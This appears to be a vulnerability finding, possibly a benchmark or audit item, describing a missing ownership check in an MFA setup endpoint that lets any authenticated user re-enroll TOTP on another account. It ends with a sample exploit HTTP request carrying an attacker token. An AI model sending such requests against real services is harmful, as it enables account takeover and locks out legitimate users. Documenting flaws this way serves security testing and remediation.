diagnosis: The MFA setup route generates a new TOTP secret and binds it to req.params.targetAccountId without verifying that the authenticated user owns or administers that account. An attacker can re-enroll MFA on another user's account, locking them out and establishing persistent secondary access.
exploit_request:
POST /api/security/mfa/setup/acc_partner_enterprise_9918 HTTP/1.1
Host: security.cloud.internal:6003
Authorization: Bearer <attacker_jwt>
Accept: application/json
